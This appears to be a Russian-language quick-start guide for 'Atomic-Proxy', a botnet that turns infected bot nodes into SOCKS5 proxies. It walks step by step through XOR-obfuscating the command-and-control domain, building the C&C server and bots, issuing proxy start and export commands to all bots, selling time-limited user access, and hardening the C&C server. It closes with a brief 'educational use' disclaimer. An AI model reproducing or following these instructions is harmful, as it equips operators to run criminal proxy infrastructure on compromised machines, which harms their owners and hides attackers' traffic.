# Atomic-Proxy Quick Start Guide

## Быстрый старт за 10 минут

### 1. Подготовка окружения

```bash
# Установка зависимостей
sudo apt-get update
sudo apt-get install gcc golang-1.20 sqlite3 git -y

# Клонирование проекта
cd ~/
git clone <your-repo>
cd atomic-proxy
```

### 2. Настройка домена C&C

```bash
# Компиляция XOR утилиты
cd tools
gcc xor.c -o xor

# Генерация обфусцированного домена
./xor string your-domain.com
# Вывод: \xAB\xCD\xEF... (скопируйте это)

# Добавьте в bot/table.c:
# add_entry(TABLE_CNC_DOMAIN, "\xAB\xCD\xEF...", <длина>);
```

### 3. Инициализация базы данных

```bash
cd ../assets
sqlite3 data.db < init_proxy_db.sql

# Проверка
sqlite3 data.db "SELECT * FROM users;"
```

### 4. Компиляция

```bash
cd ..

# Компиляция C&C сервера
cd cnc
go mod init atomic-proxy
go get github.com/gorilla/mux
go get github.com/mattn/go-sqlite3
go get github.com/alexeyco/simpletable
go get github.com/naoina/toml
go build

# Компиляция ботов
cd ..
chmod +x build.sh
./build.sh
```

### 5. Запуск C&C сервера

```bash
cd cnc
./cnc
```

Вы должны увидеть:
```
Welcome back! Atomic-Proxy Version V9.2
Success Bot server started on port > [0.0.0.0:1995]
Proxy database tables initialized
```

### 6. Подключение к админ-панели

Откройте новый терминал:

```bash
telnet localhost 666
```

Введите учетные данные:
- Username: `root`
- Password: `root@123`

**ВАЖНО**: Немедленно смените пароль!

### 7. Основные команды

```
# Помощь
help

# Просмотр подключенных узлов
bots

# Запуск прокси на всех ботах (порт 1080)
proxy start port=1080 auth=false maxconns=50

# Просмотр активных прокси
proxy list

# Статистика
proxy stats

# Экспорт списка прокси
proxy export

# Остановка прокси
proxy stop
```

### 8. Использование API

```bash
# Получить список прокси
curl "http://localhost:81/proxies?user=root&password=root@123"

# Запустить прокси через API
curl "http://localhost:81/proxy/start?user=root&password=root@123&port=1080"

# Получить статистику
curl "http://localhost:81/proxy/stats?user=root&password=root@123"

# Экспорт в текстовом формате
curl "http://localhost:81/proxy/list?user=root&password=root@123&format=ip:port"
```

### 9. Тестирование прокси

После запуска прокси на боте с IP 192.168.1.100:

```bash
# Проверка через curl
curl -x socks5://192.168.1.100:1080 https://api.ipify.org

# Проверка через wget
wget -e use_proxy=yes -e http_proxy=192.168.1.100:1080 https://api.ipify.org

# Python пример
python3 -c "
import requests
proxies = {'http': 'socks5://192.168.1.100:1080', 'https': 'socks5://192.168.1.100:1080'}
print(requests.get('https://api.ipify.org', proxies=proxies).text)
"
```

### 10. Управление пользователями

```bash
# Создание нового пользователя (30 дней доступа)
create testuser password123 30

# Предоставление API доступа
api true testuser

# Изменение лимитов
maxtime 7200 testuser
conns 5 testuser
```

## Архитектура системы

```
┌─────────────────┐
│   Admin Panel   │
│   (Port 666)    │
└────────┬────────┘
         │
         ▼
┌─────────────────┐     ┌──────────────┐
│   C&C Server    │────▶│   Database   │
│   (Port 1995)   │     │   (SQLite)   │
└────────┬────────┘     └──────────────┘
         │
         │ Commands
         ▼
┌─────────────────┐
│   Bot Nodes     │
│  SOCKS5 Proxy   │
│   (Port 1080)   │
└────────┬────────┘
         │
         │ Traffic
         ▼
┌─────────────────┐
│  Target Server  │
└─────────────────┘

┌─────────────────┐
│   REST API      │
│   (Port 81)     │
└─────────────────┘
```

## Структура проектa

```
atomic-proxy/
├── bot/                    # Исходники бота (C)
│   ├── main.c             # Главный модуль
│   ├── proxy.c            # SOCKS5 прокси
│   ├── proxy.h
│   ├── protocol.h         # Протокол связи
│   └── ...
├── cnc/                    # C&C сервер (Go)
│   ├── main.go            # Точка входа
│   ├── admin.go           # Админ-панель
│   ├── api.go             # REST API
│   ├── proxies.go         # Управление прокси
│   ├── proxy_db.go        # Работа с БД
│   ├── slaves.go          # Управление ботами
│   └── ...
├── assets/
│   ├── server.toml        # Конфигурация
│   └── init_proxy_db.sql  # SQL схема
├── tools/
│   └── xor.c              # XOR обфускация
├── build.sh               # Скрипт сборки
├── README.md
├── PROXY_GUIDE.md         # Полная документация
└── QUICK_START.md         # Этот файл
```

## Безопасность

### Обязательные шаги после установки:

1. **Смените пароль администратора**
   ```
   # В админ-панели при первом входе система попросит это сделать
   ```

2. **Настройте файрвол**
   ```bash
   # Разрешить доступ только с вашего IP
   sudo ufw allow from YOUR_IP to any port 666
   sudo ufw allow from YOUR_IP to any port 81
   sudo ufw allow 1995/tcp
   sudo ufw enable
   ```

3. **Включите TLS для API**
   
   Отредактируйте `assets/server.toml`:
   ```toml
   [templates.api]
   listener = "0.0.0.0:81"
   tls = true
   key = "path/to/api.key"
   cert = "path/to/api.cert"
   ```

4. **Создайте SSL сертификаты**
   ```bash
   openssl req -x509 -newkey rsa:4096 -keyout api.key -out api.cert -days 365 -nodes
   ```

## Мониторинг

### Логи C&C сервера

```bash
# Запуск с выводом в файл
./cnc 2>&1 | tee cnc.log

# Мониторинг в реальном времени
tail -f cnc.log
```

### Проверка активности

```bash
# Количество подключенных ботов
sqlite3 assets/data.db "SELECT COUNT(*) FROM proxy_stats WHERE status='running';"

# Общая статистика
sqlite3 assets/data.db "SELECT status, COUNT(*) FROM proxy_stats GROUP BY status;"

# Последние логи
sqlite3 assets/data.db "SELECT * FROM proxy_logs ORDER BY timestamp DESC LIMIT 10;"
```

## Устранение неполадок

### Боты не подключаются

1. Проверьте, что C&C сервер запущен
2. Проверьте домен в `bot/table.c`
3. Убедитесь, что порт 1995 открыт
4. Проверьте DNS разрешение домена

### Прокси не стартуют

1. Убедитесь, что боты подключены (`bots`)
2. Проверьте, не занят ли порт на боте
3. Убедитесь, что у бота есть права на bind
4. Проверьте логи: `sqlite3 data.db "SELECT * FROM proxy_logs;"`

### API не отвечает

1. Проверьте, что сервер слушает на порту 81
2. Проверьте учетные данные
3. Убедитесь, что у пользователя есть API доступ
4. Проверьте файрвол

### Низкая производительность

1. Увеличьте лимит файловых дескрипторов:
   ```bash
   ulimit -n 65535
   ```

2. Оптимизируйте параметры TCP:
   ```bash
   sudo sysctl -w net.ipv4.tcp_fin_timeout=15
   sudo sysctl -w net.ipv4.tcp_tw_reuse=1
   ```

3. Уменьшите `maxconns` в конфигурации прокси

## Следующие шаги

1. Прочитайте полную документацию: [PROXY_GUIDE.md](PROXY_GUIDE.md)
2. Изучите API endpoints в [api.go](cnc/api.go)
3. Настройте автоматический мониторинг
4. Интегрируйте GeoIP для отслеживания локаций
5. Реализуйте балансировку нагрузки

## Поддержка

Для вопросов об образовательном использовании создайте issue в репозитории.

**Помните**: Это учебный проект. Используйте только для легальных целей и с явного разрешения владельцев систем.
